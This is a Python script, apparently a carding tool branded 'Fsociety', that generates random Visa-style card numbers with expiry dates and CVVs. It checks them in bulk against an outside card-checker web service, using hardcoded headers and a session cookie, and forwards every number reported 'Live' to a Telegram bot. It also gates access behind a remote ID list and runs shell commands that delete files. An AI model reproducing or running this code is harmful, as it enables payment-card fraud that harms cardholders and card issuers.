import requests,json
import os,random
import pyfiglet
import os, wget
import sys
import time


os.system('pip install requests')
os.system('pip install python')
os.system('pip install pyfiglet ')
os.system('rm -rf list.txt')

os.system('clear')
os.system('rm -rf shk.txt')
os.system('id -u > shk.txt')
uidd = open('shk.txt', 'r')
for j in uidd:
    sp = j.split()

def chk(): 
  uuid = str(os.geteuid()) + str(os.getlogin()) 
  id = "-".join(uuid)
  print("\n\n\x1b[37;1mYour ID : "+id) 
  try: 
    httpCaht = requests.get("https://raw.githubusercontent.com/blak11/CheckerVisa/main/list.txt").text 
    if id in httpCaht: 
      print("\033[92mYOUR ID IS ACTIVE.........\033[97m") 
      msg = str(os.geteuid()) 
      time.sleep(1) 
      pass 
    else: 
      print("\033[33mId Activ Nya") 
      time.sleep(1) 
      sys.exit() 
  except: 
    sys.exit() 
    if name == '__main__': 
     chk() 
    
chk()








G = '\033[1;32m'
E = '\033[1;31m'
S='\033[1;30m'
P = '\033[1;31m'
A='\033[1;30m'
W = '\033[1;30m'


aa='4'

os.system('clear')
SaLam = pyfiglet.figlet_format('Fsociety')

print(' ')
Salam_Home = (A+f"""Checker Visa :) """)
def Salam_Check():

    SaLam = pyfiglet.figlet_format('Fsociety')

    print(S+SaLam)


    print(Salam_Home)


    print(' ')


    ID = input(A+' Enter your ID : ')


    token = input(' Enter Token Bot : ')


    SalamHunter = open('card.txt', 'r').read().splitlines()


    for T5b55 in SalamHunter:


      card = T5b55.split('\n')[0]

      Salam_Url = 'https://checker.visatk.com/ccn1/alien07.php'


      headers = {


'Accept': 'application/json, text/javascript, */*; q=0.01',


'Accept-Encoding': 'gzip, deflate, br',


'Accept-Language': 'ar-AE,ar;q=0.9,en-US;q=0.8,en;q=0.7',


'Connection': 'keep-alive',


'Content-Length': '57',


'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',


'Cookie': '__gads=ID=896dfad73f803363-22e04f7165cd002d:T=1648235465:RT=1648235465:S=ALNI_MY_BupuA8SUvR8FFeqs9KkcURxRpQ; PHPSESSID=4iaqql3tqilpk83g8qmvj5h5j3',


'Host': 'checker.visatk.com',


'Origin': 'https://checker.visatk.com',


'Referer': 'https://checker.visatk.com/ccn1/',


'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="99", "Google Chrome";v="99"',


'sec-ch-ua-mobile': '?0',


'sec-ch-ua-platform': '"Windows"',


'Sec-Fetch-Dest': 'empty',


'Sec-Fetch-Mode': 'cors',


'Sec-Fetch-Site': 'same-origin',


'User-Agent': 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.82 Safari/537.36',


'X-Requested-With': 'XMLHttpRequest'}


      data = {


'ajax': '1',


'do': 'check',


'cclist': card,


}

      reqq = requests.post(Salam_Url,headers=headers,data=data).text

      if 'Live' in reqq:
        print(G+f' GOOD {card} ')
        tlg = f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text=𝙷𝙸 𝙽𝙴𝚆 𝙷𝚄𝙽𝚃 𝚅𝙸𝚂𝙰 𝙲𝙰𝚁𝙳\n━━━━━━━━━━━━━\n\n- 𝚅𝙸𝚂𝙰 𝙲𝙰𝚁𝙳 ➪ {card} ✓\n\n━━━━━━━━━━━━━\n.✥. 𝙳𝙴𝚅 : @SALAMMZORI ~ 𝙲𝙷 @T5B55 "
        i = requests.post(tlg)


      if 'Die' in reqq:


        print(E+f' Card Die {card} ')


      if 'Unknown' in reqq:


        print(P+f' band {card} ')


        

def Salam_Visa():


    os.system('rm -fr card.txt')


    SaLam = pyfiglet.figlet_format('Fsociety')


    print(S+SaLam)


    print(Salam_Home)


    import random

    maker = '1234567890'


    daat = ['2022','2023','2024','2025','2026','2027','2028']


    while True:


        us = str(''.join((random.choice(maker) for i in range(14))))


        uss = str(''.join((random.choice(maker) for i in range(2))))


        uus = str(''.join((random.choice(daat) for i in range(1))))


        uuss = str(''.join((random.choice(maker) for i in range(3))))


        ccard = aa+us+'|'+uss+'|'+uus+'|'+uuss


        with open('card.txt', 'a') as fx:


              fx.write(ccard+'\n')


              print(ccard)
      
def Salo():

    print(S+SaLam)

    print(Salam_Home)

    print(G+"""
    (1) - Create Visa 
    (2) - Checker Visa

    """)


   
    Salllam = input(W+'   Choose One : ')


    if Salllam=='1' or Salllam=='01':


        os.system('clear')


        Salam_Visa()


    if Salllam=='2' or Salllam=='02':


        os.system('clear')


        Salam_Check()


       
Salo()
